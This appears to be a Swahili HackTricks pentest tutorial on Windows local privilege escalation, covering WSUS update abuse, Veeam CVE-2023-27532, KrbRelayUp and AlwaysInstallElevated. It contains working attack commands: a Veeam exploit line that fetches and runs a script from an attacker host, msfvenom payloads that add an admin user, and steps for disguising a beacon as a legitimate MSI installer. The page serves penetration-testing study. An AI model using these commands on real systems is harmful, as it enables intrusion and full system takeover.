# Kuongeza Haki za Windows za Ndani

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora ya kutafuta njia za kuongeza haki za ndani za Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unaunganisha mbinu za jumla za Windows za kuongeza haki kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mtiririko wake wa vitendo wa enumeration pia unategemea warsha na orodha za ukaguzi za jumuiya.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Nyenzo za kihistoria kuhusu mashambulizi zinajumuisha wasilisho la DerbyCon kuhusu kuongeza haki kwenye Windows.<sup>[[5]](#references)</sup>

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui access tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels ni nini kwenye Windows, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna mambo mbalimbali kwenye Windows yanayoweza **kukuzuia kuchunguza mfumo kwa enumeration**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na kufanya **enumeration** ya **mbinu** hizi zote za **ulinzi** kabla ya kuanza enumeration ya kuongeza haki:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili unaweza pia kubadilisha uhariri wa UEFI NVRAM ukiwa offline kuwa msururu wa pre-boot DMA na kubadilisha kumbukumbu ya Windows kwa kutumia patch:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ulinzi wa Admin / UIAccess silent elevation

Michakato ya UIAccess iliyoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa vibaya kufikia High IL bila maombi ya uthibitisho, AppInfo inapokaguliwa kwa njia salama iliyozungukwa. Angalia mwongozo maalum wa UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Usambazaji wa mipangilio ya registry ya ufikivu ya Secure Desktop unaweza kutumiwa vibaya kuandika thamani yoyote kwenye registry kama SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Matoleo mapya ya Windows pia yameleta njia ya LPE ya **SMB arbitrary-port**, ambapo uthibitishaji wa NTLM wa ndani wenye haki za juu huakisiwa kupitia muunganisho wa SMB TCP uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

### Enumeration ya taarifa za toleo

Angalia ikiwa toleo la Windows lina udhaifu wowote unaojulikana (pia kagua patches zilizotumika).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za Toleo

[Tovuti hii](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu 4,700 wa usalama, inayoonyesha **attack surface kubwa sana** inayotokana na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa za build ya OS, masasisho yaliyosakinishwa na vidokezo vilivyochaguliwa vya advisory; hakikisha bidhaa husika na masasisho yaliyobadilisha ya awali kabla ya kuchukulia matokeo kuwa yanatumika.

Kwa exploit ya ndani inayohusiana na toleo mahususi, angalia **usanifu wa mchakato unaoendeshwa** pamoja na usanifu wa OS. Kwenye Windows ya 64-bit, mchakato wa 32-bit huathiriwa na [uelekezaji upya wa mfumo wa faili wa WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekezwa kwenye saraka ya mfumo ya 32-bit, ilhali `%windir%\Sysnative` huupa mchakato huo ufikiaji wa saraka asilia ya mfumo. Jina hili mbadala halipatikani kwa mchakato wa 64-bit. Build ya OS au kidokezo cha KB iliyokosekana havithibitishi kuwa exploit inaweza kutumika; linganisha build inayoendeshwa, sasisho lililosakinishwa au lililochukua nafasi ya jingine, usanifu wa mchakato na masharti ya exploit na [taarifa ya usalama ya Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) ya tatizo husika.

**Ndani ya mfumo, kwa kutumia taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repos za GitHub zenye exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, credentials au taarifa zozote za Juicy zimehifadhiwa kwenye vigezo vya mazingira?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Faili za Transcript za PowerShell

Unaweza kujifunza jinsi ya kuwezesha hili katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [Sera ya PowerShell transcription](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huhifadhi faili kwenye folda ya Documents ya kila mtumiaji, lakini mpangilio wa `OutputDirectory` au `Start-Transcript -OutputDirectory` unaweza kuelekeza faili kwenye folda ya pamoja au iliyofichwa. Kagua njia halisi ya hifadhi na ACL ya faili kabla ya kukagua transcript: inaweza kuwa na hoja za amri na matokeo, yakiwemo credentials. Transcript inayosomeka ni kidokezo tu ikiwa maudhui yake yanafichua utambulisho wa kiwango cha juu zaidi unaoweza kutumika na utambulisho huo unaweza kuingia katika muktadha husika.

### PowerShell Module Logging

Maelezo ya utekelezaji wa PowerShell pipeline hurekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, huenda maelezo kamili ya utekelezaji na matokeo yasinakiliwe.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kuona matukio 15 ya mwisho kutoka kwenye kumbukumbu za PowersShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script huhifadhiwa, kuhakikisha kwamba kila kizuizi cha code kinaandikwa kinapoendeshwa. Mchakato huu huhifadhi rekodi kamili ya ukaguzi wa kila shughuli, ambayo ni muhimu kwa forensics na kuchanganua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, maelezo ya kina kuhusu mchakato hutolewa.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya logging ya Script Block yanaweza kupatikana kwenye Windows Event Viewer katika njia hii: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Viendeshi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Endpoint ya HTTP ya WSUS ni kidokezo cha kuchunguza uwezekano wa kukatiza metadata ya masasisho. Exploitation pia hutegemea kama client hutumia server hiyo ya WSUS, kama mshambuliaji anaweza kukatiza au kudhibiti trafiki yake, na sera za client kuhusu uaminifu wa masasisho na usakinishaji. URL pekee haithibitishi uwezekano wa kutekeleza code. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Anza kwa kuangalia kama mtandao unatumia sasisho la WSUS lisilotumia SSL, kwa kutekeleza amri ifuatayo kwenye cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipata jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intraneti iliyosanidiwa. Hii inathibitisha sharti la awali kwa njia ya udukuzi wa HTTP, lakini haithibitishi kwamba udukuzi wa trafiki, kukubaliwa kwa update hasidi, au usakinishaji wenye privileges za juu unawezekana. Ikiwa ni `0`, endpoint hii mahususi ya WSUS iliyosanidiwa haichaguliwi na sera hiyo.

Ili kutumia udhaifu huu, unaweza kutumia tools kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za MiTM zenye exploits zilizotayarishwa ili kuingiza updates za 'uongo' kwenye trafiki ya WSUS isiyotumia SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, hili ndilo dosari linalotumiwa na bug hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates hutumia proxy iliyosanidiwa kwenye settings za Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya mfumo wetu ili kuingilia trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye privileges za juu kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia settings za mtumiaji wa sasa, itatumia pia certificate store yake. Tukitengeneza certificate iliyosainiwa yenyewe kwa hostname ya WSUS na kuongeza certificate hiyo kwenye certificate store ya mtumiaji wa sasa, tutaweza kuingilia trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mbinu zinazofanana na HSTS kutekeleza uthibitishaji wa aina ya trust-on-first-use kwenye certificate. Ikiwa certificate iliyowasilishwa inaaminiwa na mtumiaji na ina hostname sahihi, itakubaliwa na huduma.

Unaweza kutumia udhaifu huu kwa kutumia tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (itakapotolewa).

### Updates zinazodhibitiwa na msimamizi wa WSUS

Njia tofauti ipo pale utambulisho wa sasa unapoweza **kuchapisha na kuidhinisha** updates kwenye server ya WSUS. Kagua uanachama unaotumika kwenye group ya server ya `WSUS Administrators` na permissions zozote za WSUS zilizokabidhiwa, kisha tambua group ya kompyuta za client ambayo itapokea update iliyoidhinishwa. [Microsoft inahitaji privileges za WSUS Administrator ili kuidhinisha updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaeleza uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): clients lazima ziwe na uaminifu kwa certificate ya kusaini inayotumika kwa maudhui yaliyochapishwa ndani ya mfumo. Thibitisha kwamba update inayozingatiwa imesainiwa na inakubaliwa, inatumika kwa lengo, na imesakinishwa katika muktadha wenye privileges za juu kabla ya kuichukulia kama njia ya privilege escalation. Thamani ya HTTP `WUServer` au jina la group pekee havithibitishi masharti hayo.

### Matumizi mabaya ya custom-update ya SUSDB: payloads zisizosainiwa kupitia `.txt`/`.esd`

Hili ni tatizo tofauti la mpaka wa uaminifu na kuingilia muunganisho wa HTTP WSUS: sharti la awali ni kuwa na ufikiaji wa kutosha kwa **stored procedures za database ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha custom update. Njia moja ya vitendo ya kuingia ni ku-relay akaunti ya kompyuta ya upstream WSUS kwenda kwenye server tofauti ya MSSQL inayohost `SUSDB`; sharti halisi hutegemea deployment, kwa hiyo kwanza orodhesha permissions za `EXECUTE` badala ya kudhani una haki za msimamizi wa SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya mashambulizi inayorelay uthibitishaji wa WSUS client kutoka HTTP/8530 kwenda LDAP, SMB, au AD CS, angalia [Kutumia vibaya WSUS HTTP kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Tengeneza, lenga na uidhinishe update

Mtiririko wa kazi wa custom-update hutumia procedures halali za WSUS kama API yenye vikwazo ya uchapishaji. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures zinazohusika |
| --- | --- |
| Ingiza metadata ya update | `spImportUpdate` |
| Hifadhi vipande vya XML vya masharti ya awali, vilivyowekwa katika lugha maalum na vilivyopanuliwa | `spSaveXMLFragment` |
| Husisha digest ya maudhui na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/unda group ya kompyuta na uongeze client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa group hiyo | `spDeployUpdate` yenye `@actionID = 0` na `@isAssigned = 1` |

Jina la faili, digests, ukubwa na handler ya `CommandLineInstallation` lazima zilingane katika metadata/vipande vilivyoingizwa. Baada ya kuweka URL ya maudhui na target group, idhini ya mwisho hufanana na ifuatayo; tumia vitambulishi vipya vya update, group na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS kwa kawaida hukataa maudhui yoyote ya executable ambayo hayajasainiwa. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka flag ya ukaguzi wa cheti kuwa false ikiwa jina la faili lililotolewa linaishia kwa `.txt` au `.esd`; hivyo `CheckCertificateSignature` hurukwa bila kuthibitisha kwanza kwamba byte hizo ni maandishi au picha halali ya ESD. Kwa hiyo, PE isiyobadilishwa yenye jina kama `payload.exe.txt` inaweza kupita ukaguzi wa maudhui na baadaye kuendeshwa na handler ya usakinishaji wa update ya command-line. Hii ni hitilafu ya policy/type confusion, si kughushi saini.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging na automation zinazooana na BITS

Kuita `spDeployUpdate` hufanya WSUS ichukue maudhui yaliyosajiliwa. Chanzo lazima kitimize matarajio ya HTTP ya BITS: URL inayofikika pekee haitoshi kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya masafa ya baiti. Seva isiyounga mkono Range husababisha tukio la usawazishaji la WSUS `EventId=364`, linalosema kuwa BITS inahitaji kichwa cha itifaki ya Range.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) hutengeneza SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, inajumuisha mteja wa MSSQL uliorekebishwa kwa ajili ya kuitekeleza, na huja na `BitsWebServer.py` kwa ajili ya staging ya maudhui. Matumizi ya chini kabisa katika maabara iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji bila uangalizi na persistence kupitia majaribio upya

Mwingiliano wa upande wa mteja hutegemea sera. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo `4 - Auto download and schedule install`, husababisha update iliyoidhinishwa ipakuliwe na kusakinishwa kwa ratiba iliyosanidiwa bila mtumiaji kuichagua mwenyewe. Katika majaribio, payload ambayo update yake ilibaki imeshindwa/haijakamilika ilitolewa tena mara moja baada ya mchakato wa callback kutoka, hivyo tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji unaojirudia; husababisha kelele kwa sababu mteja huonyesha hali ya update iliyoshindwa.<sup>[[39]](#references)</sup>

#### Detection na hardening pivots

Pivots muhimu za upande wa server na mteja katika mnyororo huu ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate` kwenye `SUSDB`; chunguza makundi mapya ya kulenga, vyanzo vya maudhui vya nje, payload za update za `.txt`/`.esd`, na deployment zilizofanywa na principal zisizotarajiwa (hasa akaunti zisizo za kompyuta).
- Kagua `C:\Program Files\Update Services\LogFiles` kutafuta `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (iliyoandikwa kimakosa), na `EventId=364`; linganisha uthibitishaji na kiendelezi cha payload na magic ya maudhui badala ya kutegemea kiambishi tamati.
- Tafuta usakinishaji wa Windows Update unaoshindwa/kujaribu tena mara kwa mara, pamoja na utekelezaji wa PE au shughuli zisizotarajiwa za child/network kutoka kwa maudhui yenye majina ya `.txt` au `.esd`.
- Inapowezekana, hitaji Extended Protection for Authentication kwenye huduma ya database, na punguza ufikiaji wa mtandao wa database kwa server ya WSUS na mifumo ya kiutawala iliyoidhinishwa. Punguza na kagua haki za `EXECUTE` kwenye procedures za custom-update.

## Virekebishaji vya Auto-Updater vya Watu Wengine na Agent IPC (local privesc)

Agent nyingi za enterprise huweka uso wa IPC wa localhost na channel ya update yenye upendeleo wa juu wazi. Ikiwa usajili unaweza kushawishiwa kuelekezwa kwenye server ya mshambuliaji na updater inaamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI hasidi ambayo huduma ya SYSTEM husakinisha. Tazama mbinu ya jumla (iliyotokana na mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Veeam Backup & Replication na Cloud Connect hutumia huduma kuu ya backup kwenye **TCP/9401 kwa chaguomsingi**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji usiohitaji uthibitishaji wa credentials zilizosimbwa za hifadhidata ya usanidi ndani ya mpaka wa mtandao wa backup; PoC tofauti ya umma inaonyesha njia ya kutekeleza amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Huenda huduma ikafungamana na anwani nyingine isipokuwa localhost, kwa hivyo kagua anwani na PID yake halisi.

- **Recon**: thibitisha kuwa TCP/9401 inamilikiwa na `Veeam.Backup.Service.exe`, kisha kagua bidhaa iliyosakinishwa na metadata ya patch. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patch.
- **Matoleo ya chini yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kama matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathiriwa. Toleo la faili lenye sehemu nne pekee haliwezi kutofautisha build ya msingi ambayo haijapatchiwa na patch ya baadaye kwenye namba zilezile za build. Thibitisha kitambulisho cha patch dhidi ya [historia ya build ya vendor](https://www.veeam.com/kb2680) kabla ya kusema kuwa build ya mpakani imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLL zinazohitajika kwenye saraka hiyo hiyo, kisha anzisha payload ya SYSTEM kupitia socket ya ndani:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

PoC iliyorejelewa inaonyesha utekelezaji wa amri kama SYSTEM masharti yake ya ziada yakitimia; ushauri wa vendor unaeleza suala la kufichuka kwa credential.
## KrbRelayUp

Kerberos relay ya ndani inaweza kuvuka kutoka logon yenye privilege ndogo hadi uandishi wa directory wenye privilege kubwa, pale COM server inayofaa inapothibitisha utambulisho na principal inayorelayiwa ikiwa na haki kwenye object lengwa. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) uandishi wa LDAP wa RBCD na `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp huendesha kiotomatiki baadhi ya njia hizi. Mnyororo wa RBCD unahitaji delegation inayotumika na haki kwenye object lengwa, huku mnyororo wa shadow-credential ukihitaji haki za kuandika key-credential na KDC inayotumia njia ya certificate authentication. Hakuna njia kati ya hizi inayotokana na uanachama wa domain pekee.

Kagua sera halisi ya DC ya [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL ya object ya utambulisho unaorelayiwa, na viwango vya authentication na impersonation vya COM class iliyochaguliwa. Logon type na muktadha wa credential wa caller ni muhimu: session ya WinRM inaweza kutenda tofauti na logon ya mwingiliano au ya new-credentials. Firewall/OXID routing na updates zilizosakinishwa zinaweza pia kubadilisha matokeo. Chukulia sera inayoruhusu au ACL inayolingana kama jambo linalopaswa kukaguliwa; enumeration tulivu haipaswi kusababisha COM coercion, relay authentication, au uandishi wa directory. Shadow credential ya machine account inaweza kusababisha machine ticket na, ikiwa tu account hiyo ina haki zinazohitajika za directory replication, njia tofauti ya DCSync.

Tafuta **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mfuatano wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** mipangilio hii 2 ya Registry **imewezeshwa** (thamani ni **0x1**), basi watumiaji wa kiwango chochote cha privilege wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una session ya meterpreter, unaweza kuendesha technique hii kiotomatiki kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia command `Write-UserAddMSI` kutoka power-up kuunda binary ya Windows MSI ndani ya directory ya sasa ili kuongeza privileges. Script hii huandika installer ya MSI iliyokwishacompile ambayo huomba kuongeza user/group (kwa hiyo utahitaji ufikiaji wa GUI):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kuongeza haki.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka kwamba unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **mistari ya amri**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** payload mpya ya Windows EXE TCP kwa kutumia Cobalt Strike au Metasploit kwenye `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na ubofye **Next**.
- Ipe mradi jina, kama vile **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague payload ya Beacon uliyotengeneza hivi punde. Kisha ubofye **Finish**.
- Angazia mradi wa **AlwaysPrivesc** kwenye **Solution Explorer** na katika **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna properties nyingine unazoweza kubadilisha, kama vile **Author** na **Manufacturer**, ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya mradi kulia na uchague **View > Custom Actions**.
- Bofya **Install** kulia na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na ubofye **OK**. Hii itahakikisha kwamba payload ya beacon inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwishowe, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonyeshwa, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **chinichini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachorekodiwa, kwa hivyo unapaswa kuizingatia.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

